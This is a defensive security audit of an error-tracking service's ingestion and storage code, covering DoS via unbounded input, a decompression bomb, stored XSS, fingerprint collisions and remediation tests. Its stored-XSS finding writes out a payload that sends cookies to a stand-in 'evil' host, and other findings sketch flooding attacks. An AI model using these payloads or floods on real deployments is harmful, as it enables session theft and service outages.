# A1 — Ingestion→Storage

## Summary

**Scope**: the untrusted-input path end-to-end — `src/routes/ingestion.ts`, `src/lib/envelope-parser.ts`, `src/lib/fingerprint.ts`, `src/rpc.ts` (service-binding twin of ingestion), DSN validation in `src/durable-objects/auth-state.ts` (`handleGetProjectByKey`, key generation, schema), and the storage path in `src/durable-objects/project-state.ts` (`handleIngest`, rate limiting, retention/alarm, tag/environment/release/user indexing, read-back handlers). Router wiring and CORS in `src/index.ts` reviewed for exposure. Test suite under `packages/workers-sentinel/test/` (esp. `ingestion.test.ts`, `rate-limiting.test.ts`, `retention.test.ts`, `tags.test.ts`) read as coverage evidence. Static analysis only; the local dev stack on 127.0.0.1:25304 was not touched.

**Method**: line-by-line read of the slices, tracing every value an attacker controls from HTTP request (or RPC envelope) into SQL writes and back out through read endpoints; cross-checked which behaviors are locked by tests and which are untested. Platform-limit claims (request body cap, isolate memory, per-DO SQLite storage cap) are Cloudflare-documented defaults as of this analysis and are flagged where they carry the argument.

**Confidence**: high for code-behavior findings (all reachable code was read; SQL is fully parameterized so no injection was found); medium for exploitation impact that depends on Cloudflare platform limits or on the Vue dashboard's rendering (the stored-XSS surface is cross-slice). No CRITICAL auth bypass exists: the DSN key → project binding is enforced before parsing, keys are 128-bit random and schema-UNIQUE, and DO routing uses the server-derived project ID.

The dominant theme is **no bounds anywhere on the untrusted path**: no request-size check, no envelope item-count cap, no per-event size cap, no field-length caps on most persisted strings, no tag-count cap — and both the per-project rate limit and data retention default to **disabled**. Anyone holding a DSN public key (which browser SDKs ship to every visitor) can fill a project's Durable Object storage and hammer the singleton AuthState DO that all projects and the dashboard share.

## Findings

### [HIGH] H-1 — Unbounded ingestion with rate limit and retention disabled by default: storage exhaustion / cost DoS / permanent project kill

**Files**:
- `packages/workers-sentinel/src/durable-objects/project-state.ts:415-432` (raw event persisted verbatim), `:435-452` (tags), `:1638-1644` (rate limit default-unlimited), `:1765-1768` (retention default 0), `:1320-1345` (alarm not even scheduled when retention=0)
- `packages/workers-sentinel/src/routes/ingestion.ts:87-107` (no body-size check before read/decompress/parse)
- `packages/workers-sentinel/src/lib/envelope-parser.ts:34-83` (no item-count cap)

**Description**: Nothing on the ingestion path bounds what gets stored:
- `handleIngestion` reads the full body (`c.req.arrayBuffer()`), decompresses, and parses with no size or item-count validation. Cloudflare's request-body cap (100 MB on current plans) is the only ceiling.
- `handleIngest` stores `JSON.stringify(event)` verbatim into `events.data` — every breadcrumb, stack frame, `extra` blob, context object, at whatever size the SDK (or a raw curl) sends. There is no per-event size cap, unlike the sourcemap path which enforces 5 MB (`project-state.ts:1816`).
- The only quota, `max_events_per_hour`, is **opt-in**: `checkRateLimit()` returns `{allowed: true}` when the config row is absent (`project-state.ts:1639-1644`), and `rate-limiting.test.ts:21-35` confirms 0/unlimited is the tested default.
- Retention is likewise opt-in: `getRetentionDays()` returns 0 when unset, and `alarm()` skips all deletion (`project-state.ts:1727-1759`); `scheduleNextAlarm()` doesn't even schedule a run while retention=0 and no snoozes exist.

**Production exploitation scenario**: A self-hosted instance runs a browser app whose DSN public key is in the page bundle (that is the product's intended deployment). An attacker scrapes the DSN, then scripts `POST /api/{projectId}/envelope/` with ~90 MB envelopes (or many smaller ones) each carrying thousands of `event` items padded with a giant `extra` field. With default config every event is accepted: each event burns one `events` row (up to ~body-size), up to N `event_tags` rows, plus stats/environment/release/user rows. The ProjectState DO's SQLite database (10 GB per-DO cap on current Cloudflare plans) fills; subsequent writes begin failing, so the project can no longer ingest events *and* its own retention alarm may be unable to help — retention was never enabled, and even after the owner enables it, the first alarm run must DELETE tens of GBs under DO CPU constraints while the dashboard's `handleGetTags`/`handleGetStats` GROUP BY queries time out. Meanwhile the operator pays GB-days of Durable Object storage billing. This is a persistent, unauthenticated-in-practice denial of service on any project whose DSN is public, plus a direct cost vector.

**Remediation**:
- Enforce safe defaults: a non-zero default `max_events_per_hour` and `retention_days` for new projects; make 0/unlimited an explicit owner opt-in.
- Cap request body (e.g. reject `Content-Length` > 1 MB at the route before reading), envelope item count (Sentry accepts a handful; cap at ~50), and per-event serialized size before the DO write; reject with 413.
- Cap stored payload fields server-side (truncate `events.data` or drop oversized substructures like `breadcrumbs`/`extra` beyond a budget), mirroring the sourcemap 5 MB pattern.
- Add a storage high-water mark per project DO (e.g. refuse new events when >N GB, surface an alert) so abuse fails loudly instead of corrupting operability.

### [HIGH] H-2 — Singleton AuthState DO on every ingest request: unthrottled global bottleneck and cross-project DoS

**Files**: `packages/workers-sentinel/src/routes/ingestion.ts:61-74`, `packages/workers-sentinel/src/rpc.ts:81-94`, `packages/workers-sentinel/src/durable-objects/auth-state.ts:480-512`, `packages/workers-sentinel/src/middleware/auth.ts:24-47` (same DO also serves dashboard auth).

**Description**: Every envelope — valid DSN or not — triggers a subrequest to the single AuthState DO (`idFromName('global')`) to resolve `publicKey → project`. That DO is the serialization point for *all* projects' ingestion *and* all dashboard session/API-token validation. There is no caching, no negative-result short-circuit, no per-IP or per-key throttle in front of it, and the per-project rate limit (the only throttle that exists) lives downstream in ProjectState, so it does nothing to protect this hop. A DSN lookup for an invalid key still performs a full DO round trip and SQL query (`auth-state.ts:487-495`).

**Production exploitation scenario**: An attacker who knows only the *shape* of a DSN (no valid key needed — any 32-hex string works) floods `POST /api/00000000-0000-0000-0000-000000000000/envelope/?sentry_key=deadbeef...`. Each request costs the attacker one cheap HTTP request but forces a fetch into the one global DO. Because Durable Objects process input sequentially, the queue backs up: legitimate ingestion for **every project on the instance** and dashboard logins (`authMiddleware` → same DO) slow down or time out. This is a cross-tenant availability kill-switch for a multi-project deployment, achievable with a laptop, and it works even when every project has a rate limit configured. Per-event loop amplification adds to it: one envelope with N items causes 1 AuthState fetch plus N ProjectState fetches.

**Remediation**:
- Cache the `publicKey → project` mapping in the worker (in-isolate Map with TTL, or a Workers KV mirror maintained on project create/delete) so steady-state ingestion never touches AuthState.
- Add a cheap pre-filter in the worker: reject obviously malformed keys (length/charset) and throttle by IP + key prefix (e.g. token-bucket in DO or Cloudflare WAF rate-limiting rule) before any DO subrequest.
- Keep AuthState work O(1) and read-only for ingestion; consider a dedicated read replica pattern (separate DO namespace or KV) so dashboard auth and ingestion auth don't share one queue.

### [MEDIUM] M-1 — Gzip decompression bomb: no cap on decompressed size

**File**: `packages/workers-sentinel/src/lib/envelope-parser.ts:169-180`; reached from `ingestion.ts:85-94` after DSN validation.

**Description**: `maybeDecompress` pipes the request body through `DecompressionStream('gzip')` with no limit on output size. A ~1 MB gzip stream can declare tens/hundreds of MB (highly compressible padding), and `new Response(...).text()` materializes the whole thing in isolate memory (128 MB ceiling). This executes before any size check (there is none) and before the ProjectState rate limit (which is per-project anyway, and defaults off).

**Production exploitation scenario**: With any valid DSN key (public in browser apps), an attacker repeatedly POSTs `Content-Encoding: gzip` bodies that expand far past the isolate memory limit. Each request kills/resets the worker invocation; Cloudflare may bill the CPU/memory churn, and legitimate traffic on the same isolate suffers. Even *successful* large expansions (e.g. 90 MB text) then flow into `parseEnvelope`'s `split('\n')` (duplicating the string) and per-line `JSON.parse`, multiplying peak memory.

**Remediation**: Stream-decompress with a byte counter and abort at a fixed cap (e.g. 1 MB) returning 413; also pre-check `Content-Length` against a max. Wrap decompression and parsing in the same budget so a small compressed size can never buy unbounded processed bytes.

### [MEDIUM] M-2 — No per-event or per-field size validation on the storage path; several indexed columns get unbounded attacker strings

**Files**: `packages/workers-sentinel/src/durable-objects/project-state.ts:415-432` (verbatim `data`, `tags` JSON, user columns), `:399-411` (issue insert), `packages/workers-sentinel/src/lib/fingerprint.ts:54-71, 114-136` (only `value` truncated — `type`, `filename`, `function`, `transaction` are not).

**Description**: The only length truncations on the path are: title `value` to 100 chars (`fingerprint.ts:61`), message to 128 (`:67`), metadata `value` to 200 (`:123,132`), and tag key/value to 200 (`project-state.ts:440-441`). Everything else is stored at full attacker-chosen length, several into indexed or key columns:
- `issues.title` = `exc.type` (unbounded) + truncated value; `issues.culprit` = `event.transaction` or frame filename/function (unbounded) — `fingerprint.ts:76-109`.
- `releases.version` is the **PRIMARY KEY** with no length cap (`project-state.ts:488-504`, schema `:130-138`).
- `issue_environments.environment` is PK-keyed, unbounded (`:472-485`).
- `events.user_id/user_email/user_ip`, `transaction_name` — unbounded (`:415-432`).
- `events.data` and `events.tags` — the entire raw JSON, twice for tags.

**Production exploitation scenario**: Same DSN-holder as H-1 sends events whose `exception.values[0].type` is a 5 MB string: it lands in `issues.title` (displayed in every issue list), in `metadata.type` (`extractMetadata` does not truncate `type`), and in the new-issue webhook text (`webhook.ts:32` interpolates `issue.title` verbatim into `text` sent to the customer's Slack/Teams-style receiver, where a giant or crafted string may break rendering). Distinct giant `release` strings bloat the `releases` PK index; a giant `environment` string pollutes the environment facet. Combined with default-off quotas this is index bloat and dashboard latency DoS even when total row counts are modest.

**Remediation**: Apply a uniform field budget at ingest: validate/truncate `type` (e.g. 200 chars), `transaction`/`culprit` (e.g. 200), `release`/`environment` (e.g. 100), user fields (e.g. 128), and reject events whose serialized size exceeds a cap. Reject non-string or absurdly long `event_id` (see L-1) with 400.

### [MEDIUM] M-3 — Unbounded cardinality writes: tag rows, per-user rows, environments, releases

**Files**: `packages/workers-sentinel/src/durable-objects/project-state.ts:435-452` (event_tags: per-entry inserts, only length-checked), `:551-582` (issue_users per distinct SHA-256 user identifier), `:472-485` (issue_environments), `:488-540` (releases/release_issues), `:934-975` (handleGetTags aggregation that later scans them).

**Description**: `event.tags` has no count cap — an event with 10,000 string tags (each ≤200 chars, so length checks pass) produces 10,000 `INSERT OR IGNORE` statements and 10,000 `event_tags` rows with two indexes (`idx_event_tags_key_value`, `idx_event_tags_issue`). Each event also fans out up to 4 more row-types. `issue_users` grows one row per distinct attacker-chosen `user.id` (hash input is attacker text; the 32-hex truncated SHA-256 is collision-safe enough, but cardinality is unbounded). Sentry's real product caps tags per event (on the order of dozens); this implementation caps nothing.

**Production exploitation scenario**: With the default-unlimited quota, an attacker posts 1,000 events × 10,000 tags = 10M `event_tags` rows in minutes. Storage and the two tag indexes balloon; every dashboard visit then runs `handleGetTags`'s `GROUP BY key` over the whole table plus an N+1 top-values query (`:938-972`), making the tags page a self-inflicted DoS. Distinct `user.id` values likewise inflate `user_count` and `issue_users` (one row each), corrupting per-issue user metrics.

**Remediation**: Cap tags per event (e.g. first 20-32 entries, matching Sentry behavior) and total tag payload size; cap distinct environments/releases per project (or their lengths, see M-2); consider capping `issue_users` growth per issue per hour. Bound `handleGetTags` work with a time-boxed scan or maintained aggregate.

### [MEDIUM] M-4 — Stored-XSS payload surface: attacker-controlled strings persisted and re-served to dashboard clients and webhooks

**Files**: `packages/workers-sentinel/src/durable-objects/project-state.ts:415-432` (`data` = raw event), `:849, 874, 889` (`handleGetIssueEvents`/`handleGetEvent`/`handleGetLatestEvents` return `JSON.parse(row.data)` verbatim), `:1602-1618` (`rowToIssue` → title/culprit/metadata), `packages/workers-sentinel/src/lib/webhook.ts:31-45` (title/culprit into outbound webhook text).

**Description**: The full attacker-supplied event (HTML/JS-laden exception messages, frame filenames, breadcrumbs with arbitrary markup, user email/id, `transaction`) is stored byte-for-byte and served back without sanitization to authenticated dashboard users through the issues/events APIs, and titles/culprits are interpolated into webhook payloads delivered to whatever receiver the project owner configured. Whether this becomes script execution depends entirely on the Vue dashboard's rendering (cross-slice; if any view renders these strings as HTML — e.g. `v-html` for stacktrace formatting or markdown-ish message rendering — this is stored XSS against project members). Note the API responses are JSON with `Content-Type: application/json` (`jsonResponse`), which limits direct browser rendering; the risk is the frontend consumer.

**Production exploitation scenario**: Attacker with a project's public DSN sends `{"exception":{"values":[{"type":"Error","value":"<img src=x onerror=fetch('//evil/'+document.cookie)>"}]}}`. The string is stored as title and event data. A project admin opens the issue in the dashboard; if the component renders the message/title as HTML (common for prettifying stacktraces), the payload executes in the operator's session context. Independently of XSS, the same event can push a crafted title into the owner's Slack webhook (`buildWebhookPayload` text), enabling phishing-style injection in chat receivers that render links/markup.

**Remediation**: Sanitize/truncate at ingest (defense in depth: strip control chars, bound lengths per M-2); ensure the dashboard renders all event-derived strings as text (verify no `v-html` on event fields — coordinate with the dashboard slice); document webhook receivers must treat `text` as plain text; consider HTML-escaping in `buildWebhookPayload`.

### [LOW] L-1 — Attacker-controlled `event_id`, `timestamp`, and `level`/`platform` accepted without validation

**Files**: `packages/workers-sentinel/src/routes/ingestion.ts:99-107` (raw JSON path), `packages/workers-sentinel/src/lib/envelope-parser.ts:149-157` (defaults applied only when absent), `packages/workers-sentinel/src/durable-objects/project-state.ts:337-339` (`event.event_id || crypto.randomUUID()`, `event.timestamp || now`), `:455-462` (stats bucketed by the forged timestamp), `:844, 885` (list ordering by forged `timestamp`).

**Description**: `event_id` is stored as-is (arbitrary string, any length — it's the events PK); duplicates cause an SQLite PK-conflict throw → 500 `internal_error` after partial processing (no overwrite, so no integrity break, and the worker swallows it). `timestamp` is used for `issue_stats` buckets and for `ORDER BY timestamp DESC` in event lists; a far-future timestamp pins an attacker event to the top of "latest events" indefinitely and creates orphan future buckets; a non-date string makes `getHourBucket` throw (`toISOString` on Invalid Date) → 500 after the event row was already inserted (partial ingest).

**Production exploitation scenario**: DSN holder sends `"timestamp": "9999-12-31T23:00:00.000Z"` events; the project's event feed is permanently headed by attacker content, and stats charts get bogus far-future buckets. Sending `"timestamp": "garbage"` yields 500s (noise in observability, minor). Retention itself is not bypassable this way — see Non-issues (deletion keys on server-side `received_at`).

**Remediation**: Validate `event_id` as 32-hex (generate server-side otherwise), parse `timestamp` server-side and replace invalid/out-of-range values with receive time; clamp buckets to a sane window around `now`; return 409/400 for duplicate IDs rather than a 500.

### [LOW] L-2 — 32-bit djb2 fingerprint hash enables deliberate issue-grouping collisions

**File**: `packages/workers-sentinel/src/lib/fingerprint.ts:228-234` (hash reduced to 32 bits), `:13-18` (SDK-controlled explicit fingerprint hashed directly), `project-state.ts:373-375` (fingerprint is the grouping key; `issues.fingerprint` UNIQUE).

**Description**: `simpleHash` is djb2 truncated to 32 bits with a comment admitting production should use SHA-256. An attacker who can compute hashes offline (the algorithm is in the shipped JS bundle of any browser SDK user, and the format is deterministic) can craft distinct errors whose fingerprints collide — either with each other (force-merging unrelated events into one issue, corrupting counts/titles/stats) or with a victim issue's fingerprint (attaching events to a specific existing issue in the same project, polluting its `count`, `user_count`, environments, and last_seen). Because `fingerprint` (SDK-supplied array) is hashed directly, the attacker fully controls the preimage. The code itself flags this (`fingerprint.ts:226-227`).

**Production exploitation scenario**: Attacker enumerates ~2^16 message variants offline to find a collision with a target issue's 8-hex fingerprint (or simply harvests the fingerprint by observing grouping behavior), then floods events that group into the victim issue — inflating it to "top issue", poisoning its title lineage stats, or hiding real signal inside noise. Impact is integrity/availability within one project; requires that project's DSN.

**Remediation**: Replace with `crypto.subtle.digest('SHA-256')` (async already available) and keep more entropy (≥128 bits) in the stored fingerprint; that also removes the `{{ default }}`-style preimage control concern.

### [LOW] L-3 — CORS policy is wildcard-origin with credentials enabled

**File**: `packages/workers-sentinel/src/index.ts:30-38`.

**Description**: `cors({ origin: '*', credentials: true })` on `/api/*`. Browsers reject `Access-Control-Allow-Origin: *` for credentialed requests, and auth is Bearer-token (not cookie) based, so this is not directly exploitable CSRF — but it is a misconfiguration that becomes dangerous the moment cookie auth is introduced, and `credentials: true` combined with `*` signals intent that doesn't match the config.

**Remediation**: Set `origin` to the dashboard's deployed origin(s) and keep `credentials` consistent with the actual auth mechanism.

### [LOW] L-4 — LIKE wildcards not escaped in issue search

**File**: `packages/workers-sentinel/src/durable-objects/project-state.ts:648-651` (contrast with the correctly escaped `:995-999`).

**Description**: `title LIKE '%${query}%'` interpolates user `query` as a parameter (no SQLi) but `%`/`_` inside the query act as wildcards — a dashboard user can scan with `%` patterns; it also guarantees full scans for leading-wildcard queries. Minor functional/filter issue and mild query-cost lever for an authenticated low-privilege member. Not injection.

**Remediation**: Escape `%`, `_`, `\` as done in `handleGetTagValues`; consider an FTS index if search matters.

### [INFO] I-1 — Duplicate attacker-chosen `event_id` surfaces as 500 with partial state

`project-state.ts:415-432` — PK conflict throws, caught by the DO's outer handler, returned as 500 `{error:'internal_error', message: <sqlite text>}`; `ingestion.ts:144-149` logs it and continues. No overwrite occurs (INSERT, not upsert), and the SQLite message is logged server-side, not returned to the SDK. Fold into L-1 remediation (validate + 409).

### [INFO] I-2 — Password storage is unsalted SHA-256 (adjacent slice, noted for completeness)

`auth-state.ts:1081-1092` — `hashPassword` is a single unsalted SHA-256; `verifyPassword` compares hex with `===`. Not on the ingestion path, but it lives in my assigned DO file: database disclosure makes password recovery trivial via rainbow tables. Recommend scrypt/bcrypt/PBKDF2 (WebCrypto PBKDF2 is available in Workers). Flagged to the auth-focused analyst's slice.

### [INFO] I-3 — DSN key comparison is a database equality lookup, not constant-time — acceptable

`auth-state.ts:487-495` — the public key is resolved via indexed `WHERE public_key = ?`. There is no manual string comparison of a secret on the ingestion path to make timing-leakable, and the key is a random 128-bit identifier (see Non-issues); timing signals over a DO subrequest are not practically exploitable. No action needed beyond the caching in H-2.

### [INFO] I-4 — Unauthenticated `GET /api/:projectId/security` and DSN key in query string

`ingestion.ts:185-191` returns static `{allowedDomains:['*'], scrubData:true}` with no auth — matches Sentry's browser-SDK handshake; no data leaked (the `projectId` path segment isn't validated or echoed from storage). `?sentry_key=` in URLs (ingestion.ts:30-33) is Sentry-standard but puts the DSN key in access logs; prefer header auth where SDKs allow. `console.error('Parse error:', ...)` (ingestion.ts:109) writes attacker-influenced error text into observability logs — beware log-injection when reading dashboards.

## Integration test throughlines

These are concrete, currently-uncovered scenarios the suite should pin down (method + path + preconditions + expected). Today none of the abuse cases are tested — `ingestion.test.ts` covers happy paths, auth-missing/invalid-key 401s, grouping, tags capture, and the legacy `/store/` route only.

1. **Cross-project DSN confusion (authz)** — `POST /api/{projectB.id}/envelope/?sentry_key={projectA.publicKey}`, both projects pre-created. Expect 400 `project_mismatch` and **zero** events stored in B (query B's issues as its owner). Guards the URL-vs-key binding (`ingestion.ts:80-82`).
2. **Valid key, wrong-length/malformed key charset rejected before DO hit** — `POST /api/{id}/envelope/?sentry_key=zzz` (3 chars). Expect 401; optionally assert no AuthState subrequest for keys that can't be well-formed (supports H-2 remediation).
3. **Envelope item-count cap** — one envelope with 5,000 `{"type":"event"}` items, default-config project. Expected after fix: 413/400 with only the first N items ingested. Today: all items ingested (demonstrates H-1).
4. **Oversized single event** — valid event with a 5 MB `extra` blob. Expect 413/400. Today: stored verbatim in `events.data` (H-1/M-2).
5. **Decompression bomb** — `Content-Encoding: gzip`, ~100 KB body expanding to >128 MB of JSON. Expect 413 (size cap) and worker survives. Today: decompression is unbounded (M-1).
6. **Prototype-pollution canary** — envelope event containing top-level `"__proto__": {"polluted": true}` and nested `constructor.prototype` payloads; then authenticate as project owner and GET issues/events. Expect: event either rejected or stored with `__proto__` as an own data property only; no behavioral change in any API response (locks in the current no-merge safety as a regression guard — the code never `Object.assign`/deep-merges parsed events, but this should stay true).
7. **Unexpected item types ignored** — envelope with `attachment`, `session`, `client_report`, `statsd`, `check_in`, and malformed-JSON-payload items plus one valid `event`. Expect 200, exactly one event stored, no attachment bytes persisted (`extractEvents` whitelist — `envelope-parser.ts:142-164`).
8. **Rate limit is per-project and stops mid-envelope** — project A limited to 3/hour, project B unlimited; POST one envelope with 10 events to A, then one event to B. Expect: A gets exactly 3 stored events and the HTTP response is 429 with `Retry-After`; B's event succeeds unaffected. (Partially covered for single events in `rate-limiting.test.ts`; the multi-item-abort and cross-project independence are not.)
9. **Rate limit cannot be evaded by forged timestamps** — project limited to 2/hour; send 2 events with `timestamp` one hour in the past, then a 3rd with current time. Expect the 3rd is 429 (counter keys on server time — `project-state.ts:466`); also send events with future timestamps and assert `rate-limit` status count only reflects accepted events.
10. **Retention keys on `received_at`, not attacker `timestamp`** — project with `retentionDays: 1`; ingest an event with `timestamp` = 40 days ago; run alarm; expect the event is **retained** (received recently) and an event genuinely received 40 days ago (inject via clock control or seeded storage) is deleted. Locks in `alarm()`'s server-time deletion (`project-state.ts:1732`).
11. **Default config safety** (post-fix) — fresh project, no owner PATCH: `GET /api/projects/{slug}/rate-limit` should report the new safe default (non-zero), and `GET settings` a non-zero `retentionDays`. Today's suite pins the *unsafe* default (`rate-limiting.test.ts:21-35`, `retention.test.ts:61-92`) — those tests must be flipped with the fix.
12. **Tag cardinality cap** — event with 10,000 tags. Expect ≤N tag rows created and event still ingested (or rejected per policy). Today: 10,000 rows (M-3).
13. **Field length caps** — event with 1 MB `exception.values[0].type` and 1 MB `transaction`. Expect truncation/rejection and webhook `text` bounded. Today: stored unbounded and delivered to webhook (M-2/M-4).
14. **Invalid/duplicate event_id handling** — events with `"event_id": "not-a-uuid"` then a resend of the same ID. Expect: first accepted (or normalized), duplicate returns 4xx — not 500 — with no overwrite of the original row (L-1/I-1).
15. **Fingerprint explicit-value grouping safety** (post-SHA-256 fix) — two crafted events with SDK `fingerprint` arrays that collide under djb2 but not under SHA-256. Expect two distinct issues (L-2 regression guard).

## Non-issues / hardening notes

**Checked and sound**:

- **No SQL injection on the storage path.** Every statement in `project-state.ts` and `auth-state.ts` uses bound parameters; dynamic fragments are safe: `handleGetIssues` sort field validated against `ALLOWED_SORT_FIELDS` (`:594-601, 617`), sort direction is a constant, bulk-update placeholders are generated `?` lists (`:806-818`), tag-value LIKE escapes `%`/`_`/`\` (`:995-999`).
- **No prototype-pollution sink.** Parsed event JSON is never `Object.assign`ed or deep-merged into other objects; mutation is direct property assignment (`extractEvents`), transport is `JSON.stringify`, and the one spread (`handleGetLatestEvents` `{...JSON.parse(row.data), issueId}`, `:889`) uses CreateDataProperty semantics — an own `__proto__` in stored data cannot rewire prototypes. (Canary test #6 above recommended as a guard.)
- **DSN/project binding is sound.** URL `projectId` must equal the AuthState-resolved project ID before the body is read (`ingestion.ts:79-82`); DO routing uses the server-side `project.id`, never the URL param (`:118`); the RPC entrypoint enforces the same binding (`rpc.ts:99-102`); `public_key` is `UNIQUE NOT NULL` (`auth-state.ts:30`) and generated from `crypto.getRandomValues` at 128 bits (`:1094-1101`), so cross-project key reuse is not possible and brute-force is infeasible.
- **Auth ordering is correct.** Missing/invalid key → 401 before the body is read or parsed (`ingestion.ts:56-74`); `atob` failure on Basic auth is handled; `extractKeyFromAuthHeader` returning `undefined` for a valueless `sentry_key` token is inert under the truthiness check.
- **Retention cannot be evaded by timestamp forgery.** `alarm()` deletes by `received_at` (server clock) — `project-state.ts:1732` — and recompute/count logic is internal.
- **Rate-limit state is durable and consistent.** Counter is persisted per server-hour bucket (`:467-470`), restored on DO wake via the persisted row with an `issue_stats` fallback (`warmRateLimitCounter`, `:1620-1636`); DO input gates make check-then-increment race-free; bucket rollover cleans old rows (`:1647-1652`). The mechanism is fine — the problems are the default-off switch (H-1) and its per-project-only, downstream-of-AuthState position (H-2).
- **No regex on attacker filter input.** Inbound filters use substring/equality matching (`shouldFilterEvent`, `:1396-1439`), so filter patterns (admin-authored anyway) cannot cause ReDoS. Filter count is capped at 100 (`:1468-1475`).
- **Sourcemap upload is the model the event path should copy**: 200/500-char field caps, 5 MB content cap, JSON validity check (`:1810-1824`, tested in `sourcemaps.test.ts:143-162`).
- **Read endpoints leak only to authenticated members**: all project-data routes sit behind `authMiddleware` (`index.ts:55-62`); ingestion mounts are separate (`index.ts:52`); the DO's `http://internal/*` surface is unreachable externally.
- **Webhook URL hygiene**: `handleUpdateProject` requires HTTPS and owner/admin role before a webhook can be set (`auth-state.ts:569-589`), so ingestion cannot be used to register an arbitrary http:// SSRF target; `sendWebhook` failures are contained (`webhook.ts:48-63`).

**Defense-in-depth ideas** (beyond per-finding remediations):

- Validate `Content-Type: application/x-sentry-envelope` on the envelope routes and reject others early.
- Add per-DSN-key quotas in addition to per-project quotas (a project may have multiple keys in the future; and per-key limits survive project merges).
- Bound `events.data` retention-critical fields: store `received_at`-derived columns for ordering, keep `timestamp` as display-only (already partially true — order-by uses `timestamp`, which L-1 addresses).
- Consider `X-Sentry-Auth`-only auth for server SDKs and header auth for browsers to keep DSN keys out of URLs and logs.
- Observability: alert on per-project storage growth and 429 rates so H-1-style abuse is visible before the DO cap.
- Flip the safe-defaults tests (throughline #11) in the same PR that introduces caps, so the suite stops pinning unlimited-by-default as intended behavior.
